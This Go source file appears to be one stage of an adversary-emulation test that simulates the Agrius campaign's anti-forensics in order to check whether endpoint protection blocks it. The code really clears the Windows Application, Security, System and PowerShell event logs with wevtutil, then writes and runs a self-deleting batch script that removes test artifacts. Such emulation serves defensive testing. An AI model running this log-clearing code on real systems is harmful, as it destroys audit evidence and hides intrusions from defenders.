//go:build windows
// +build windows

// Stage 5: Anti-Forensics and Evidence Destruction (T1070.001)
// Simulates Agrius evidence destruction:
// - Attempts to clear Windows Event Logs via wevtutil
// - Creates and executes self-deletion batch script (remover.bat)

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "7d39b861-644d-4f8b-bb19-4faae527a130"
	TECHNIQUE_ID   = "T1070.001"
	TECHNIQUE_NAME = "Indicator Removal: Clear Windows Event Logs"
	STAGE_ID       = 5
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// Event log channels targeted by Agrius for evidence destruction
var targetLogChannels = []string{
	"Application",
	"Security",
	"System",
	"Windows PowerShell",
	"Microsoft-Windows-PowerShell/Operational",
}

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	fmt.Printf("[STAGE %s] Starting %s\n", TECHNIQUE_ID, TECHNIQUE_NAME)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogMessage("INFO", TECHNIQUE_ID, "Simulating anti-forensics and evidence destruction (Agrius campaign)")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
		LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		os.Exit(determineExitCode(err))
	}

	fmt.Printf("[STAGE %s] %s executed successfully\n", TECHNIQUE_ID, TECHNIQUE_NAME)
	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("%s executed successfully", TECHNIQUE_NAME))
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Anti-forensics simulation completed")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	clearAttempts := 0
	clearBlocked := 0

	// Phase 1: Attempt to clear Windows Event Logs
	fmt.Printf("[STAGE %s] Phase 1: Attempting to clear Windows Event Logs\n", TECHNIQUE_ID)
	LogMessage("WARNING", TECHNIQUE_ID, "Attempting to clear Windows Event Logs via wevtutil")

	for _, channel := range targetLogChannels {
		clearAttempts++
		fmt.Printf("[STAGE %s] Attempting to clear: %s\n", TECHNIQUE_ID, channel)
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Clearing event log: %s", channel))

		cmd := exec.Command("wevtutil.exe", "cl", channel)
		output, err := cmd.CombinedOutput()
		outputStr := strings.TrimSpace(string(output))

		if err != nil {
			clearBlocked++
			fmt.Printf("[STAGE %s] Event log clear blocked: %s (err: %v, output: %s)\n",
				TECHNIQUE_ID, channel, err, outputStr)
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Event log clear blocked for %s: %v", channel, err))
		} else {
			fmt.Printf("[STAGE %s] WARNING: Event log cleared: %s\n", TECHNIQUE_ID, channel)
			LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("Event log %s cleared without prevention!", channel))
		}
	}

	fmt.Printf("[STAGE %s] Event log clearing: %d attempted, %d blocked\n",
		TECHNIQUE_ID, clearAttempts, clearBlocked)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Event log clearing summary: %d attempted, %d blocked",
		clearAttempts, clearBlocked))

	// Phase 2: Self-deletion mechanism (remover.bat)
	fmt.Printf("[STAGE %s] Phase 2: Creating self-deletion batch script (remover.bat)\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Creating self-deletion batch script (Agrius remover.bat pattern)")

	removerPath := filepath.Join("c:\\F0", "remover.bat")

	// Build the remover.bat content (Agrius pattern: ping delay + self-delete)
	// This only cleans up F0RT1KA test files in c:\F0, not system files
	removerContent := fmt.Sprintf(`@echo off
REM F0RT1KA SIMULATION - Agrius remover.bat anti-forensics pattern
REM This script simulates the self-deletion mechanism used by Agrius
REM Real Agrius remover.bat uses ping-based delays before cleanup
echo [F0RT1KA] Anti-forensics simulation - remover.bat executed at %%DATE%% %%TIME%%
echo [F0RT1KA] Simulating ping-based delay (Agrius pattern: ping 127.0.0.1 -n 10)
ping 127.0.0.1 -n 3 >nul
echo [F0RT1KA] Cleaning up simulation artifacts...
if exist "c:\F0\wiper_test" (
    echo [F0RT1KA] Removing wiper test directory...
    rmdir /s /q "c:\F0\wiper_test" 2>nul
)
if exist "c:\F0\aspxspy.aspx" del /f "c:\F0\aspxspy.aspx" 2>nul
if exist "c:\F0\error5.aspx" del /f "c:\F0\error5.aspx" 2>nul
if exist "c:\F0\contact.aspx" del /f "c:\F0\contact.aspx" 2>nul
if exist "c:\F0\GMER64.sys" del /f "c:\F0\GMER64.sys" 2>nul
if exist "c:\F0\ipsec_helper_svc.exe" del /f "c:\F0\ipsec_helper_svc.exe" 2>nul
echo [F0RT1KA] Artifact cleanup complete
REM Self-delete this batch file (Agrius pattern)
del /f "%%~f0" 2>nul
`)

	if err := os.WriteFile(removerPath, []byte(removerContent), 0755); err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Failed to create remover.bat: %v", err))
	} else {
		LogFileDropped("remover.bat", removerPath, int64(len(removerContent)), false)
		fmt.Printf("[STAGE %s] remover.bat created at %s\n", TECHNIQUE_ID, removerPath)

		// Check if remover.bat got quarantined
		time.Sleep(1 * time.Second)
		if _, err := os.Stat(removerPath); os.IsNotExist(err) {
			clearBlocked++
			fmt.Printf("[STAGE %s] remover.bat quarantined by EDR\n", TECHNIQUE_ID)
			LogMessage("INFO", TECHNIQUE_ID, "remover.bat quarantined by EDR")
		} else {
			// Execute the remover.bat
			fmt.Printf("[STAGE %s] Executing remover.bat\n", TECHNIQUE_ID)
			LogMessage("WARNING", TECHNIQUE_ID, "Executing remover.bat for artifact cleanup")

			removerCmd := exec.Command("cmd.exe", "/C", removerPath)
			removerOutput, removerErr := removerCmd.CombinedOutput()
			removerOutputStr := strings.TrimSpace(string(removerOutput))

			if removerErr != nil {
				clearBlocked++
				fmt.Printf("[STAGE %s] remover.bat execution blocked: %v\n", TECHNIQUE_ID, removerErr)
				LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("remover.bat execution blocked: %v", removerErr))
			} else {
				fmt.Printf("[STAGE %s] remover.bat output: %s\n", TECHNIQUE_ID, removerOutputStr)
				LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("remover.bat output: %s", removerOutputStr))
			}
		}
	}

	// Evaluate results
	totalAttempts := clearAttempts + 1 // +1 for remover.bat
	fmt.Printf("[STAGE %s] Anti-forensics summary: %d total attempts, %d blocked\n",
		TECHNIQUE_ID, totalAttempts, clearBlocked)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Anti-forensics summary: %d attempts, %d blocked",
		totalAttempts, clearBlocked))

	// If all event log clearing AND remover.bat were blocked
	if clearBlocked == totalAttempts {
		return fmt.Errorf("all anti-forensics operations blocked (%d/%d)", clearBlocked, totalAttempts)
	}

	return nil
}

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := strings.ToLower(err.Error())
	if strings.Contains(errStr, "blocked") || strings.Contains(errStr, "denied") ||
		strings.Contains(errStr, "prevented") || strings.Contains(errStr, "quarantined") {
		return StageBlocked
	}
	if strings.Contains(errStr, "privilege") || strings.Contains(errStr, "not found") {
		return StageError
	}
	return StageBlocked
}
